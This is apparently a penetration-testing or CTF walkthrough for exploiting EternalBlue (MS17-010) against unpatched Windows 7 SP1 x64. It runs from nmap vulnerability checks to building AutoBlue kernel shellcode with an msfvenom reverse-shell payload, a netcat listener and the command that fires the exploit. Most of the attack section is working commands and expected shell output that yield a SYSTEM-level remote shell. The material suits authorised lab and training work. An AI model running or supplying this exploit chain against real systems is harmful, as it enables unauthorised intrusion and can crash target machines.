
**IMPORTANT: This walkthrough demonstrates EternalBlue (3ndG4me/AutoBlue-MS17-010 implementation) against unpatched Windows 7 SP1 x64. All four preconditions must hold — verified in Step 1.**

- **SMBv1 enabled on target** — EternalBlue exploits `srv.sys`; SMB 2.x+ uses `srv2.sys` and is unaffected. If `NT LM 0.12` is absent from the dialect list, EternalBlue cannot work.
- **MS17-010 not patched** — KB4012212 / KB4012598 close the buffer-handling bug.
- **Target is x64** — this walkthrough's exploit (`eternalblue_exploit7.py` + `eternalblue_kshellcode_x64.asm`) is x64-specific; not interchangeable with x86.
- **Target OS is Windows 7 SP1 (NT 6.1, build 7601)** — `eternalblue_exploit7.py` is targeted for Win 7 kernel layout. Other MS17-010-vulnerable OS versions (Server 2008 R2, Windows 8, Server 2012) require different AutoBlue scripts or kernel offsets.

**Risk: EternalBlue can BSOD the target on failure.** Recoverable on a CTF box (reset); a denial-of-service event on a real engagement — get explicit authorisation before running. Assumes no active EDR/AV on target (typical of legacy/lab targets; modern Defender flags the shellcode patterns immediately).

## Step 1 — Preflight checks

All checks must pass before proceeding to Step 2.

### Check 1 — Vulnerability and SMBv1 confirmation

`sudo nmap -p 445 --script smb-vuln-ms17-010,smb-protocols <ip>`

Output contains two script sections. Both signals must pass.

**Signal A — vulnerability:** Look for `VULNERABLE:` line referencing `ms17-010`.

- `VULNERABLE` → Signal A passes.
- `NOT VULNERABLE` → target patched. Abandon walkthrough. Return to Step 6 Vulnerability Analysis.
- Inconclusive / script error → troubleshoot (port filtering, firewall, host responsiveness) before proceeding. Do not fire the exploit on an unconfirmed target.

**Signal B — SMBv1 dialect:** Look for `NT LM 0.12` in the dialects list.

- `NT LM 0.12` present → Signal B passes.
- `NT LM 0.12` absent → SMBv1 disabled. EternalBlue cannot work. Abandon walkthrough.

Both signals pass → proceed to Check 2.

### Check 2 — Architecture

`cat os_<ip>.txt`

- Explicit `x64` / `amd64` / `64-bit` → proceed to Check 3.
- Explicit `x86` / `32-bit` → wrong walkthrough; use the x86 sibling ([[Windows Foothold Walkthroughs/MS17-010 EternalBlue Windows 7 SP1 x86]] — not yet built).
- No architecture indicator → default to x64. nmap Windows OS detection rarely exposes architecture; Win 7 SP1 era boxes are overwhelmingly x64 (especially Pro / Enterprise / Ultimate editions). Risk per gotcha header. Proceed to Check 3.

### Check 3 — OS version match

`cat os_<ip>.txt`

Two conditions must both hold.

**Condition A — Product family is `Windows 7`.** `os_<ip>.txt` must contain the string `Windows 7` (e.g., `OS: Windows 7 ...` from smb-os-discovery, or CPE `cpe:/o:microsoft:windows_7`). 

**Condition B — Service Pack 1.** Look for `7601`, `SP1`, or `Service Pack 1`. `eternalblue_exploit7.py` is built for the Win 7 SP1 kernel layout; RTM (build 7600) has different offsets.

Both conditions hold → all preflight checks pass. Proceed to Step 2.

- `Windows Server 2008 R2` instead of `Windows 7` → wrong walkthrough. Use the Server 2008 R2 sibling (not yet built).
- `Windows 7` but build 7600 / no SP1 marker → wrong walkthrough. RTM kernel offsets differ from SP1.
- Other Windows (XP, 8, 10, Server 2003 / 2012 / 2016) → wrong walkthrough.

## Step 2 — Build payload

### Clone AutoBlue

From the engagement working directory:

`git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git`

`cd AutoBlue-MS17-010`

### Assemble kernel shellcode

`nasm -f bin shellcode/eternalblue_kshellcode_x64.asm -o sc_x64_kernel.bin`

### Generate reverse shell payload

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -a x64 -f raw -o sc_x64_msf.bin`

### Concatenate

`cat sc_x64_kernel.bin sc_x64_msf.bin > sc_x64.bin`

Final payload: `sc_x64.bin`.

## Step 3 — Deliver and catch

### Start listener

In a dedicated terminal:

`sudo nc -lvnp <lport>`

### Fire exploit

In a separate terminal, from the AutoBlue working directory:

`python3 eternalblue_exploit7.py <ip> sc_x64.bin`

### Confirm shell

Listener displays:

```
Listening on 0.0.0.0 <lport>
Connection received on <ip> <random_port>
Microsoft Windows [Version 6.1.7601]

C:\Windows\system32>
```

### Verify context

Primary:
`set USERPROFILE` (type this do not copy and paste)

Fallback (this command may disconnect shell):
`cmd.exe /c whoami`

### Decision

**Foothold confirmed:**

- `USERPROFILE=C:\Windows\system32\config\systemprofile` (or `whoami` returns `nt authority\system`) → SYSTEM-level foothold (highest privileges) → [[Windows Privilege Escalation Checksheet]].
- `USERPROFILE=` any other path (or `whoami` returns non-SYSTEM context) → user-level foothold → [[Windows Privilege Escalation Checksheet]].

**Verification didn't complete:**

- Shell dropped during or before verification → `ping <ip>`:
  - Unreachable → reset target (CTF/lab) or abandon and log (real engagement).
  - Reachable → re-fire Step 3. Max 3 attempts. After 3 → return to [[Step 6. Vulnerability Analysis]].
- No connection received → `ping <ip>`:
  - Unreachable → reset target (CTF/lab) or abandon and log (real engagement).
  - Reachable + Check 2 defaulted to x64 → target may be x86. Route to [[MS17-010 EternalBlue Windows 7 SP1 x86]].
  - Reachable + Check 2 confirmed x64 → arch is not the issue. Other blocker (EDR, network filter, listener config). Abandon EternalBlue → return to [[Step 6. Vulnerability Analysis]].